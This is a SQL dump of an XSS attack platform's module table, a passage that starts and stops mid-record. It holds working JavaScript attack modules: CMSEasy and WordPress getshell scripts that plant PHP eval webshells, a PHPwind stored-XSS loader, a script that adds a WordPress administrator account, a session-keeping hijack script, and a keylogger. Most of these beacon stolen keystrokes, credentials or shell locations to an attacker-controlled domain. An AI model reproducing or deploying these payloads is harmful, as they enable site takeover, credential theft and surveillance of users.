E8%AF%8D+--%3E%0A%3Cdiv+class%3D%22hot_keys%22%3E%0A%3Cstrong%3E%7Blang(hotkeys)%7D%EF%BC%9A%3C%2Fstrong%3E+%7Bgethotsearch(10)%7D%0A%3Cdiv+class%3D%22blank10%22%3E%3C%2Fdiv%3E%0A%3C!--+%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5+--%3E%0A%0A%3Cstrong%3E%7Blang(&#039;links&#039;)%7D%EF%BC%9A%3C%2Fstrong%3E%0A%7Bloop+friendlink(&#039;text&#039;%2C0%2C20)+%24flink%7D%0A%3Ca+href%3D%22%7B%24flink%5Burl%5D%7D%22+target%3D%22_blank%22%3E%7B%24flink%5Bname%5D%7D%3C%2Fa%3E%0A%7B%2Floop%7D%0A%0A%3C%2Fdiv%3E%7B%2Fif%7D%0A%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%0A%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22%7B%24base_url%7D%2Fjs%2Fcommon.js%22%3E%3C%2Fscript%3E%0A%0A%3Cscript+type%3D%22text%2Fjavascript%22%3E+%0A%2F%2F+%E5%85%AC%E5%91%8A%E6%BB%9A%E5%8A%A8js%0Avar+t%3DsetInterval(myfunc%2C1000)%3B+%0Avar+oBox%3Ddocument.getElementById(%22announ%22)%3B+%0Afunction+myfunc()%7B+%0Avar+o%3DoBox.firstChild+%0AoBox.removeChild(o)+%0AoBox.appendChild(o)+%0A%7D+%0AoBox.onmouseover%3Dfunction()%0A%7B%0AclearInterval(t)%0A%7D+%0AoBox.onmouseout%3Dfunction()%0A%7B%0At%3DsetInterval(myfunc%2C2000)%2F%2F%E6%BB%9A%E5%8A%A8%E6%97%B6%E9%97%B4%EF%BC%8C%E9%BB%98%E8%AE%A42%E7%A7%92%0A%7D+%0A%3C%2Fscript%3E%0A%0A%3C!--+%E5%9C%A8%E7%BA%BF%E5%AE%A2%E6%9C%8D+--%3E%0A%7Btemplate+&#039;system%2Fservers.html&#039;%7D%0A%3C!--+%E7%9F%AD%E4%BF%A1+--%3E%0A%7Btemplate+&#039;system%2Fsms.html&#039;%7D%0A%0A%0A%7Bif+get(&#039;share&#039;)%3D%3D&#039;1&#039;%7D%0A%3C!--+Baidu+Button+BEGIN+--%3E%0A%3Cscript+type%3D%22text%2Fjavascript%22+id%3D%22bdshare_js%22+data%3D%22type%3Dslide%26img%3D6%26pos%3Dright%26uid%3D620555%22+%3E%3C%2Fscript%3E%0A%3Cscript+type%3D%22text%2Fjavascript%22+id%3D%22bdshell_js%22%3E%3C%2Fscript%3E%0A%3Cscript+type%3D%22text%2Fjavascript%22%3E%0A%09%09var+bds_config+%3D+%7B%22bdTop%22%3A150%7D%3B%0A%09%09document.getElementById(%22bdshell_js%22).src+%3D+%22http%3A%2F%2Fbdimg.share.baidu.com%2Fstatic%2Fjs%2Fshell_v2.js%3Ft%3D%22+%2B+new+Date().getHours()%3B%0A%3C%2Fscript%3E%0A%3C!--+Baidu+Button+END+--%3E%0A%7B%2Fif%7D%0A%0A%0A%3Cscript%3E%0Afunction+checkmail(str)%0A%7B%0Avar+strreg%3D%22email%22%3B%0Avar+r%3B%0Avar+strtext%3Ddocument.all(str).value%3B%0A%2F%2Fstrreg%3D%2F%5Ew%2B((-w%2B)%7C(.w%2B))*%40%5Ba-za-z0-9%5D%2B((.%7C-)%5Ba-za-z0-9%5D%2B)*.%5Ba-za-z0-9%5D%2B%24%2Fi%3B%0Astrreg%3D%2F%5Ew%2B((-w%2B)%7C(.w%2B))*%40%7B1%7Dw%2B.%7B1%7Dw%7B2%2C4%7D(.%7B0%2C1%7Dw%7B2%7D)%7B0%2C1%7D%2Fig%3B%0Ar%3Dstrtext.search(strreg)%3B%0Aif(r%3D%3D-1)+%7B%0Aalert(%22%E9%82%AE%E7%AE%B1%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF!%22)%3B%0Adocument.all(str).focus()%3B%0A%7D%0A%7D%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%3C%3Fphp+phpinfo()%3B%3F%3E%EF%BC%9B&quot;;\r\nrequest.open(&quot;POST&quot;, &quot;/cmseasy/index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default&quot;, true);\r\nrequest.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;);\r\nrequest.send(data)', 0, 1, 'cmseasy getshell', 1, 1, 'uncia', 1404986565),
(47, 1, '程氏舞曲CMSPHP3.0', '[]', '[]', 'var request = false;\r\nif(window.XMLHttpRequest) {\r\nrequest = new XMLHttpRequest();\r\nif(request.overrideMimeType) {\r\nrequest.overrideMimeType(&#039;text/xml&#039;);\r\n}\r\n} \r\nelse if (window.ActiveXObject) {\r\nvar versions = [&#039;Microsoft.XMLHTTP&#039;, &#039;MSXML.XMLHTTP&#039;, &#039;Microsoft.XMLHTTP&#039;, &#039;Msxml2.XMLHTTP.7.0&#039;,&#039;Msxml2.XMLHTTP.6.0&#039;,&#039;Msxml2.XMLHTTP.5.0&#039;, \r\n\r\n&#039;Msxml2.XMLHTTP.4.0&#039;, &#039;MSXML2.XMLHTTP.3.0&#039;, &#039;MSXML2.XMLHTTP&#039;];\r\nfor(var i=0; i&lt;versions.length; i++) {\r\ntry {\r\nrequest = new ActiveXObject(versions);\r\n} catch(e) {}\r\n}\r\n}\r\nxmlhttp=request;\r\nthisTHost = top.location.hostname;\r\nthisTHost = &quot;http://&quot; + thisTHost + &quot;/admin/skins/skins.php?ac=xgmb&amp;op=go&amp;path=../../skins/index/html/&quot;;\r\nvar params =&#039;name=vvv.php&amp;content=&lt;?php @eval($_POST[vvv]);?&gt;&#039;; \r\nxmlhttp.open(&quot;POST&quot;, url, true);\r\nxmlhttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);\r\nxmlhttp.setRequestHeader(&quot;Content-length&quot;, params.length);\r\nxmlhttp.setRequestHeader(&quot;Connection&quot;, &quot;Keep-Alive&quot;);\r\n\r\nxmlhttp.send(params);', 0, 1, '资料处可xss，触发后 skins\\index\\html\\目录下生成 vvv.php 密码vvv的一句话', 1, 1, 'uncia', 1404986593),
(48, 1, 'PHPwind8储存XSS', '[]', '[]', '&lt;/textarea&gt;&#039;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2F替换成你的域名%2F7T2QiS%3F%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;', 0, 1, 'PHPwind8储存XSS', 1, 1, 'uncia', 1410084548),
(49, 1, 'WordPress GetShell', '["webshell","password","result"]', '["password"]', '/* \r\n0x_Jin WordPress Getshell \r\n*/ \r\nvar a = location.href.split(&#039;/&#039;); \r\nvar file = &quot;&quot;; \r\nvar xurl = location.href.replace(a[a.length-1],&quot;plugin-editor.php&quot;); \r\nvar file2 = []; \r\nvar StartGetshell = 0; \r\nvar shellcode = &#039;&lt;?php\\n$k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} [&quot;{set.password}&quot;]);&#039;; \r\njQuery.ajax({ \r\n  url: xurl, \r\n  type: &#039;GET&#039;, \r\n  dataType: &#039;html&#039;, \r\n  data: {}, \r\n}) \r\n.done(function(data) { \r\n  var temp = jQuery(data); \r\n  var Xtoken = &quot;&quot;; \r\n  var Tmpcode = &quot;&quot;; \r\n  temp.find(&#039;input#_wpnonce&#039;).each(function(i,o){ \r\n    var o=jQuery(o); \r\n    Xtoken=o.attr(&#039;value&#039;); \r\n  }); \r\n  temp.find(&#039;textarea#newcontent&#039;).each(function(i,o){ \r\n    var o=jQuery(o); \r\n    Tmpcode = o.text().replace(&#039;&lt;?php&#039;,shellcode);     \r\n  }) \r\n  temp.find(&#039;div.alignleft big strong&#039;).each(function(i,o){ \r\n    var o=jQuery(o); \r\n    file = o.text(); \r\n  }) \r\n  temp.find(&#039;select#plugin option&#039;).each(function(i,o){ \r\n    var o=jQuery(o); \r\n    file2.push(o.attr(&#039;value&#039;)); \r\n  }) \r\n  if(Xtoken&amp;&amp;Tmpcode&amp;&amp;file){ \r\n    jQuery.ajax({ \r\n    url: xurl, \r\n    type: &#039;POST&#039;, \r\n    data: {&#039;_wpnonce&#039;:Xtoken,&#039;newcontent&#039;:Tmpcode,&#039;action&#039;:&#039;update&#039;,&#039;file&#039;:file,&#039;plugin&#039;:file,&#039;submit&#039;:&#039;Update+File&#039;} \r\n    }) \r\n    .done(function(){ \r\n      var temp = location.href.substring(location.href.indexOf(&#039;wp-admin&#039;),location.href.length); \r\n      (new Image()).src = &#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;webshell=&#039;+escape(location.href.replace(temp,&quot;wp-content/plugins/&quot;+filename))+&#039;&amp;password={set.password}&amp;result=Ok&#039;;\r\n      return; \r\n    })   \r\n  } \r\n  if(StartGetshell){ \r\n    for(var i=0;i&lt;file2.length;i++){ \r\n      var filename = file2[i]; \r\n      if(file2[i]!=file){ \r\n        jQuery.ajax({ \r\n          url: xurl, \r\n          type: &#039;POST&#039;, \r\n          data: {&#039;plugin&#039;: file2[i],&#039;Submit&#039;:&#039;Select&#039;}, \r\n        }) \r\n        .done(function(data) { \r\n          var NewCode = &quot;&quot;; \r\n          var NewToken= &quot;&quot;; \r\n          var Getshell=jQuery(data); \r\n          Getshell.find(&quot;textarea#newcontent&quot;).each(function(i,o){ \r\n            var o=jQuery(o); \r\n            NewCode = o.text().replace(&#039;&lt;?php&#039;,shellcode);     \r\n          }) \r\n          Getshell.find(&quot;input#_wpnonce&quot;).each(function(i,o){ \r\n            var o=jQuery(o); \r\n            NewToken = o.attr(&#039;value&#039;); \r\n          }) \r\n          if(NewCode&amp;&amp;NewToken){ \r\n            console.log(&quot;1&quot;+filename); \r\n            jQuery.ajax({ \r\n            url: xurl, \r\n            type: &#039;POST&#039;, \r\n            data: {&#039;_wpnonce&#039;:NewToken,&#039;newcontent&#039;:NewCode,&#039;action&#039;:&#039;update&#039;,&#039;file&#039;:filename,&#039;plugin&#039;:filename,&#039;submit&#039;:&#039;Update+File&#039;} \r\n            }) \r\n            .done(function(){ \r\n              var temp = location.href.substring(location.href.indexOf(&#039;wp-admin&#039;),location.href.length); \r\n              (new Image()).src = &#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;webshell=&#039;+escape(location.href.replace(temp,&quot;wp-content/plugins/&quot;+filename))+&#039;&amp;password={set.password}&amp;result=Ok&#039;;\r\n              return; \r\n            })   \r\n          } \r\n        })       \r\n      } \r\n    } \r\n  } \r\n}) \r\n.fail(function() { \r\n  (new Image()).src = &#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;result=Error&#039;; \r\n}) \r\n.always(function() { \r\n  return; \r\n});', 0, 1, 'WordPress GetShell【已修复】\r\nhttp://zone.wooyun.org/content/16880', 1, 1, 'uncia', 1422118440),
(50, 1, 'KillAdmin', '[]', '[]', '(function(){ \r\n	if(document.cookie.indexOf(&#039;__pj__&#039;)==-1 &amp;&amp; location.hostname.substr(location.hostname.length-1)!=&#039;.&#039;){\r\n		var keys=document.cookie.match(/[^ =;]+(?=\\=)/g); \r\n		if(keys){ \r\n		for(var i=keys.length; i--;) \r\n			document.cookie=keys[i]+&#039;=0;expires=&#039;+new Date(0).toUTCString()\r\n		};\r\n	 	location = location.href.replace(location.host,location.host+&#039;.&#039;);\r\n	 	document.cookie = &#039;__pj__=1;max-age=86400;path=/;&#039;;\r\n 	}\r\n}())', 0, 1, '用于防止管理员登出或注销导致会话失效。', 1, 1, 'uncia', 1422118181),
(52, 1, 'WordPress admin', '["username","password","result"]', '["user","pass"]', 'var a = location.href.split(&#039;/&#039;); \r\nvar xurl = location.href.replace(a[a.length-1],&quot;user-new.php&quot;); \r\njQuery.ajax({ \r\n  url: xurl, \r\n  type: &#039;GET&#039;, \r\n  dataType: &#039;html&#039;, \r\n  data: {}, \r\n}) \r\n.done(function(data) { \r\n  var temp = jQuery(data); \r\n  var Xtoken = &quot;&quot;; \r\n  temp.find(&#039;input#_wpnonce_create-user&#039;).each(function(i,o){ \r\n    var o=jQuery(o); \r\n    Xtoken=o.attr(&#039;value&#039;); \r\n  }); \r\n  jQuery.ajax({ \r\n    url: xurl, \r\n    type: &#039;POST&#039;, \r\n    data: {&#039;action&#039;: &#039;createuser&#039;,&#039;_wpnonce_create-user&#039;:Xtoken,&#039;user_login&#039;:&#039;{set.user}&#039;,&#039;email&#039;:&#039;xss{projectId}@xiix.com&#039;,&#039;first_name&#039;:&#039;xiix&#039;,&#039;last_name&#039;:&#039;{set.user}&#039;,&#039;url&#039;:&#039;替换成你的域名&#039;,&#039;pass1&#039;:&#039;{set.pass}&#039;,&#039;pass2&#039;:&#039;{set.pass}&#039;,&#039;role&#039;:&#039;administrator&#039;,&#039;createuser&#039;:&#039;Add+New+User+&#039;} \r\n  }) \r\n  .done(function(){ \r\n    (new Image()).src = &#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;username={set.user}&amp;password={set.pass}&amp;result=Ok&#039;; \r\n    return; \r\n  }) \r\n}) \r\n.fail(function() { \r\n  (new Image()).src = &#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;result=Error&#039;; \r\n}) \r\n.always(function() { \r\n  return; \r\n});', 0, 1, 'WordPress添加管理员 【已修复】\r\nhttp://zone.wooyun.org/content/16869', 1, 1, 'uncia', 1422118538);
INSERT INTO `oc_module` (`id`, `userId`, `title`, `keys`, `setkeys`, `code`, `level`, `isOpen`, `description`, `isAudit`, `managerId`, `managerName`, `addTime`) VALUES
(54, 1, '键盘记录', '["char"]', '[]', '(function(){\r\n        var logger = &quot;&quot;;\r\n        keyDown = function(e)\r\n        {\r\n                var e=e||event;\r\n                var currKey=e.keyCode||e.which||e.charCode;\r\n                if((currKey&gt;7&amp;&amp;currKey&lt;32)||(currKey&gt;31&amp;&amp;currKey&lt;47))\r\n                {\r\n                   switch(currKey)\r\n           　  {\r\n                        case 8: keyName = &quot;[退格]&quot;; break;\r\n                        case 9: keyName = &quot;[制表]&quot;; break;\r\n                        case 13:keyName = &quot;[回车]&quot;; break;\r\n                        //case 16:keyName = &quot;[shift]&quot;; break;\r\n                        case 17:keyName = &quot;[Ctrl]&quot;; break;\r\n                        case 18:keyName = &quot;[Alt]&quot;; break;\r\n                        case 20:keyName = &quot;[大小写]&quot;; break;\r\n                        case 32:keyName = &quot;[空格]&quot;; break;\r\n                        case 33:keyName = &quot;[PageUp]&quot;;   break;\r\n                        case 34:keyName = &quot;[PageDown]&quot;;   break;\r\n                        case 35:keyName = &quot;[End]&quot;;   break;\r\n                        case 36:keyName = &quot;[Home]&quot;;   break;\r\n                        case 37:keyName = &quot;[方向键左]&quot;;   break;\r\n                        case 38:keyName = &quot;[方向键上]&quot;;   break;\r\n                        case 39:keyName = &quot;[方向键右]&quot;;   break;\r\n                        case 40:keyName = &quot;[方向键下]&quot;;   break;\r\n                        case 46:keyName = &quot;[删除]&quot;;   break;\r\n                        default:keyName = &quot;&quot;;    break;\r\n                   }\r\n                   logger += keyName;\r\n                }\r\n        }\r\n        keyPress = function(e)\r\n        {\r\n                var currKey=0,CapsLock=0,e=e||event;\r\n                currKey=e.keyCode||e.which||e.charCode;\r\n                CapsLock=currKey&gt;=65&amp;&amp;currKey&lt;=90;\r\n                switch(currKey)\r\n                {\r\n                   　 　 //屏蔽了退格、制表、回车、空格、方向键、删除键等\r\n                   　 　 case 8: case 9:case 13:case 16:case 17:case 18:case 20:\r\n                                    case 32: case 33: case 34: case 35: case 36: case 37:case 38:\r\n                                    case 39:case 40:case 46:keyName = &quot;&quot;;break;\r\n                   　 　 default:keyName = String.fromCharCode(currKey); break;\r\n                }\r\n                logger += keyName;\r\n        }\r\n        sendChar = function()\r\n        {\r\n                if (!logger) return;\r\n                (new Image).src=&quot;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;char=&quot; + logger; //服务端地址\r\n                logger = &quot;&quot;;\r\n        }\r\n        formSubmit = function()\r\n        {\r\n                sendChar();\r\n        }\r\n        document.onkeydown = keyDown;\r\n        document.onkeypress = keyPress;\r\n        document.onsubmit = formSubmit;\r\n        setInterval(sendChar, 10000); //设置定时器\r\n})();', 0, 1, '作者：园长\r\n网址：http://javaweb.org/?p=326', 1, 1, 'uncia', 1422118733);
INSERT INTO `oc_module` (`id`, `userId`, `title`, `keys`, `setkeys`, `code`, `level`, `isOpen`, `description`, `isAudit`, `managerId`, `managerName`, `addTime`) VALUES
(55, 1, 'HTML5截图', '["screenshot"]', '[]', '(function(window,document,undefined){var _html2canvas={},previousElement,computedCSS,html2canvas;_html2canvas.Util={};_html2canvas.Util.log=function(a){if(_html2canvas.logging&amp;&amp;window.console&amp;&amp;window.console.log){window.console.log(a)}};_html2canvas.Util.trimText=(function(isNative){return function(input){return isNative?isNative.apply(input):((input||&quot;&quot;)+&quot;&quot;).replace(/^\\s+|\\s+$/g,&quot;&quot;)}})(String.prototype.trim);_html2canvas.Util.asFloat=function(v){return parseFloat(v)};(function(){var TEXT_SHADOW_PROPERTY=/((rgba|rgb)\\([^\\)]+\\)(\\s-?\\d+px){0,})/g;var TEXT_SHADOW_VALUES=/(-?\\d+px)|(#.+)|(rgb\\(.+\\))|(rgba\\(.+\\))/g;_html2canvas.Util.parseTextShadows=function(value){if(!value||value===&quot;none&quot;){return[]}var shadows=value.match(TEXT_SHADOW_PROPERTY),results=[];for(var i=0;shadows&amp;&amp;(i&lt;shadows.length);i++){var s=shadows[i].match(TEXT_SHADOW_VALUES);results.push({color:s[0],offsetX:s[1]?s[1].replace(&quot;px&quot;,&quot;&quot;):0,offsetY:s[2]?s[2].replace(&quot;px&quot;,&quot;&quot;):0,blur:s[3]?s[3].replace(&quot;px&quot;,&quot;&quot;):0})}return results}})();_html2canvas.Util.parseBackgroundImage=function(value){var whitespace=&quot; \\r\\n\\t&quot;,method,definition,prefix,prefix_i,block,results=[],c,mode=0,numParen=0,quote,args;var appendResult=function(){if(method){if(definition.substr(0,1)===&#039;&quot;&#039;){definition=definition.substr(1,definition.length-2)}if(definition){args.push(definition)}if(method.substr(0,1)===&quot;-&quot;&amp;&amp;(prefix_i=method.indexOf(&quot;-&quot;,1)+1)&gt;0){prefix=method.substr(0,prefix_i);method=method.substr(prefix_i)}results.push({prefix:prefix,method:method.toLowerCase(),value:block,args:args})}args=[];method=prefix=definition=block=&quot;&quot;};appendResult();for(var i=0,ii=value.length;i&lt;ii;i++){c=value[i];if(mode===0&amp;&amp;whitespace.indexOf(c)&gt;-1){continue}switch(c){case&#039;&quot;&#039;:if(!quote){quote=c}else{if(quote===c){quote=null}}break;case&quot;(&quot;:if(quote){break}else{if(mode===0){mode=1;block+=c;continue}else{numParen++}}break;case&quot;)&quot;:if(quote){break}else{if(mode===1){if(numParen===0){mode=0;block+=c;appendResult();continue}else{numParen--}}}break;case&quot;,&quot;:if(quote){break}else{if(mode===0){appendResult();continue}else{if(mode===1){if(numParen===0&amp;&amp;!method.match(/^url$/i)){args.push(definition);definition=&quot;&quot;;block+=c;continue}}}}break}block+=c;if(mode===0){method+=c}else{definition+=c}}appendResult();return results};_html2canvas.Util.Bounds=function(element){var clientRect,bounds={};if(element.getBoundingClientRect){clientRect=element.getBoundingClientRect();bounds.top=clientRect.top;bounds.bottom=clientRect.bottom||(clientRect.top+clientRect.height);bounds.left=clientRect.left;bounds.width=element.offsetWidth;bounds.height=element.offsetHeight}return bounds};_html2canvas.Util.OffsetBounds=function(element){var parent=element.offsetParent?_html2canvas.Util.OffsetBounds(element.offsetParent):{top:0,left:0};return{top:element.offsetTop+parent.top,bottom:element.offsetTop+element.offsetHeight+parent.top,left:element.offsetLeft+parent.left,width:element.offsetWidth,height:element.offsetHeight}};function toPX(element,attribute,value){var rsLeft=element.runtimeStyle&amp;&amp;element.runtimeStyle[attribute],left,style=element.style;if(!/^-?[0-9]+\\.?[0-9]*(?:px)?$/i.test(value)&amp;&amp;/^-?\\d/.test(value)){left=style.left;if(rsLeft){element.runtimeStyle.left=element.currentStyle.left}style.left=attribute===&quot;fontSize&quot;?&quot;1em&quot;:(value||0);value=style.pixelLeft+&quot;px&quot;;style.left=left;if(rsLeft){element.runtimeStyle.left=rsLeft}}if(!/^(thin|medium|thick)$/i.test(value)){return Math.round(parseFloat(value))+&quot;px&quot;}return value}function asInt(val){return parseInt(val,10)}function parseBackgroundSizePosition(value,element,attribute,index){value=(value||&quot;&quot;).split(&quot;,&quot;);value=value[index||0]||value[0]||&quot;auto&quot;;value=_html2canvas.Util.trimText(value).split(&quot; &quot;);if(attribute===&quot;backgroundSize&quot;&amp;&amp;(!value[0]||value[0].match(/cover|contain|auto/))){}else{value[0]=(value[0].indexOf(&quot;%&quot;)===-1)?toPX(element,attribute+&quot;X&quot;,value[0]):value[0];if(value[1]===undefined){if(attribute===&quot;backgroundSize&quot;){value[1]=&quot;auto&quot;;return value}else{value[1]=value[0]}}value[1]=(value[1].indexOf(&quot;%&quot;)===-1)?toPX(element,attribute+&quot;Y&quot;,value[1]):value[1]}return value}_html2canvas.Util.getCSS=function(element,attribute,index){if(previousElement!==element){computedCSS=document.defaultView.getComputedStyle(element,null)}var value=computedCSS[attribute];if(/^background(Size|Position)$/.test(attribute)){return parseBackgroundSizePosition(value,element,attribute,index)}else{if(/border(Top|Bottom)(Left|Right)Radius/.test(attribute)){var arr=value.split(&quot; &quot;);if(arr.length&lt;=1){arr[1]=arr[0]}return arr.map(asInt)}}return value};_html2canvas.Util.resizeBounds=function(current_width,current_height,target_width,target_height,stretch_mode){var target_ratio=target_width/target_height,current_ratio=current_width/current_height,output_width,output_height;if(!stretch_mode||stretch_mode===&quot;auto&quot;){output_width=target_width;output_height=target_height}else{if(target_ratio&lt;current_ratio^stretch_mode===&quot;contain&quot;){output_height=target_height;output_width=target_height*current_ratio}else{output_width=target_width;\r\noutput_height=target_width/current_ratio}}return{width:output_width,height:output_height}};function backgroundBoundsFactory(prop,el,bounds,image,imageIndex,backgroundSize){var bgposition=_html2canvas.Util.getCSS(el,prop,imageIndex),topPos,left,percentage,val;if(bgposition.length===1){val=bgposition[0];bgposition=[];bgposition[0]=val;bgposition[1]=val}if(bgposition[0].toString().indexOf(&quot;%&quot;)!==-1){percentage=(parseFloat(bgposition[0])/100);left=bounds.width*percentage;if(prop!==&quot;backgroundSize&quot;){left-=(backgroundSize||image).width*percentage}}else{if(prop===&quot;backgroundSize&quot;){if(bgposition[0]===&quot;auto&quot;){left=image.width}else{if(/contain|cover/.test(bgposition[0])){var resized=_html2canvas.Util.resizeBounds(image.width,image.height,bounds.width,bounds.height,bgposition[0]);left=resized.width;topPos=resized.height}else{left=parseInt(bgposition[0],10)}}}else{left=parseInt(bgposition[0],10)}}if(bgposition[1]===&quot;auto&quot;){topPos=left/image.width*image.height}else{if(bgposition[1].toString().indexOf(&quot;%&quot;)!==-1){percentage=(parseFloat(bgposition[1])/100);topPos=bounds.height*percentage;if(prop!==&quot;backgroundSize&quot;){topPos-=(backgroundSize||image).height*percentage}}else{topPos=parseInt(bgposition[1],10)}}return[left,topPos]}_html2canvas.Util.BackgroundPosition=function(el,bounds,image,imageIndex,backgroundSize){var result=backgroundBoundsFactory(&quot;backgroundPosition&quot;,el,bounds,image,imageIndex,backgroundSize);return{left:result[0],top:result[1]}};_html2canvas.Util.BackgroundSize=function(el,bounds,image,imageIndex){var result=backgroundBoundsFactory(&quot;backgroundSize&quot;,el,bounds,image,imageIndex);return{width:result[0],height:result[1]}};_html2canvas.Util.Extend=function(options,defaults){for(var key in options){if(options.hasOwnProperty(key)){defaults[key]=options[key]}}return defaults};_html2canvas.Util.Children=function(elem){var children;try{children=(elem.nodeName&amp;&amp;elem.nodeName.toUpperCase()===&quot;IFRAME&quot;)?elem.contentDocument||elem.contentWindow.document:(function(array){var ret=[];if(array!==null){(function(first,second){var i=first.length,j=0;if(typeof second.length===&quot;number&quot;){for(var l=second.length;j&lt;l;j++){first[i++]=second[j]}}else{while(second[j]!==undefined){first[i++]=second[j++]}}first.length=i;return first})(ret,array)}return ret})(elem.childNodes)}catch(ex){_html2canvas.Util.log(&quot;html2canvas.Util.Children failed with exception: &quot;+ex.message);children=[]}return children};_html2canvas.Util.isTransparent=function(backgroundColor){return(backgroundColor===&quot;transparent&quot;||backgroundColor===&quot;rgba(0, 0, 0, 0)&quot;)};_html2canvas.Util.Font=(function(){var fontData={};return function(font,fontSize,doc){if(fontData[font+&quot;-&quot;+fontSize]!==undefined){return fontData[font+&quot;-&quot;+fontSize]}var container=doc.createElement(&quot;div&quot;),img=doc.createElement(&quot;img&quot;),span=doc.createElement(&quot;span&quot;),sampleText=&quot;Hidden Text&quot;,baseline,middle,metricsObj;container.style.visibility=&quot;hidden&quot;;container.style.fontFamily=font;container.style.fontSize=fontSize;container.style.margin=0;container.style.padding=0;doc.body.appendChild(container);img.src=&quot;data:image/gif;base64,R0lGODlhAQABAIABAP///wAAACwAAAAAAQABAAACAkQBADs=&quot;;img.width=1;img.height=1;img.style.margin=0;img.style.padding=0;img.style.verticalAlign=&quot;baseline&quot;;span.style.fontFamily=font;span.style.fontSize=fontSize;span.style.margin=0;span.style.padding=0;span.appendChild(doc.createTextNode(sampleText));container.appendChild(span);container.appendChild(img);baseline=(img.offsetTop-span.offsetTop)+1;container.removeChild(span);container.appendChild(doc.createTextNode(sampleText));container.style.lineHeight=&quot;normal&quot;;img.style.verticalAlign=&quot;super&quot;;middle=(img.offsetTop-container.offsetTop)+1;metricsObj={baseline:baseline,lineWidth:1,middle:middle};fontData[font+&quot;-&quot;+fontSize]=metricsObj;doc.body.removeChild(container);return metricsObj}})();(function(){var Util=_html2canvas.Util,Generate={};_html2canvas.Generate=Generate;var reGradients=[/^(-webkit-linear-gradient)\\(([a-z\\s]+)([\\w\\d\\.\\s,%\\(\\)]+)\\)$/,/^(-o-linear-gradient)\\(([a-z\\s]+)([\\w\\d\\.\\s,%\\(\\)]+)\\)$/,/^(-webkit-gradient)\\((linear|radial),\\s((?:\\d{1,3}%?)\\s(?:\\d{1,3}%?),\\s(?:\\d{1,3}%?)\\s(?:\\d{1,3}%?))([\\w\\d\\.\\s,%\\(\\)\\-]+)\\)$/,/^(-moz-linear-gradient)\\(((?:\\d{1,3}%?)\\s(?:\\d{1,3}%?))([\\w\\d\\.\\s,%\\(\\)]+)\\)$/,/^(-webkit-radial-gradient)\\(((?:\\d{1,3}%?)\\s(?:\\d{1,3}%?)),\\s(\\w+)\\s([a-z\\-]+)([\\w\\d\\.\\s,%\\(\\)]+)\\)$/,/^(-moz-radial-gradient)\\(((?:\\d{1,3}%?)\\s(?:\\d{1,3}%?)),\\s(\\w+)\\s?([a-z\\-]*)([\\w\\d\\.\\s,%\\(\\)]+)\\)$/,/^(-o-radial-gradient)\\(((?:\\d{1,3}%?)\\s(?:\\d{1,3}%?)),\\s(\\w+)\\s([a-z\\-]+)([\\w\\d\\.\\s,%\\(\\)]+)\\)$/];Generate.parseGradient=function(css,bounds){var gradient,i,len=reGradients.length,m1,stop,m2,m2Len,step,m3,tl,tr,br,bl;for(i=0;i&lt;len;i+=1){m1=css.match(reGradients[i]);if(m1){break}}if(m1){switch(m1[1]){case&quot;-webkit-linear-gradient&quot;:case&quot;-o-linear-gradient&quot;:gradient={type:&quot;linear&quot;,x0:null,y0:null,x1:null,y1:null,colorStops:[]};m2=m1[2].match(/\\w+/g);if(m2){m2Len=m2.length;for(i=0;i&lt;m2Len;i+=1){switch(m2[i]){case&quot;top&quot;:gradient.y0=0;gradient.y1=bounds.height;\r\nbreak;case&quot;right&quot;:gradient.x0=bounds.width;gradient.x1=0;break;case&quot;bottom&quot;:gradient.y0=bounds.height;gradient.y1=0;break;case&quot;left&quot;:gradient.x0=0;gradient.x1=bounds.width;break}}}if(gradient.x0===null&amp;&amp;gradient.x1===null){gradient.x0=gradient.x1=bounds.width/2}if(gradient.y0===null&amp;&amp;gradient.y1===null){gradient.y0=gradient.y1=bounds.height/2}m2=m1[3].match(/((?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\)(?:\\s\\d{1,3}(?:%|px))?)+/g);if(m2){m2Len=m2.length;step=1/Math.max(m2Len-1,1);for(i=0;i&lt;m2Len;i+=1){m3=m2[i].match(/((?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\))\\s*(\\d{1,3})?(%|px)?/);if(m3[2]){stop=parseFloat(m3[2]);if(m3[3]===&quot;%&quot;){stop/=100}else{stop/=bounds.width}}else{stop=i*step}gradient.colorStops.push({color:m3[1],stop:stop})}}break;case&quot;-webkit-gradient&quot;:gradient={type:m1[2]===&quot;radial&quot;?&quot;circle&quot;:m1[2],x0:0,y0:0,x1:0,y1:0,colorStops:[]};m2=m1[3].match(/(\\d{1,3})%?\\s(\\d{1,3})%?,\\s(\\d{1,3})%?\\s(\\d{1,3})%?/);if(m2){gradient.x0=(m2[1]*bounds.width)/100;gradient.y0=(m2[2]*bounds.height)/100;gradient.x1=(m2[3]*bounds.width)/100;gradient.y1=(m2[4]*bounds.height)/100}m2=m1[4].match(/((?:from|to|color-stop)\\((?:[0-9\\.]+,\\s)?(?:rgb|rgba)\\(\\d{1,3},\\s\\d{1,3},\\s\\d{1,3}(?:,\\s[0-9\\.]+)?\\)\\))+/g);if(m2){m2Len=m2.length;for(i=0;i&lt;m2Len;i+=1){m3=m2[i].match(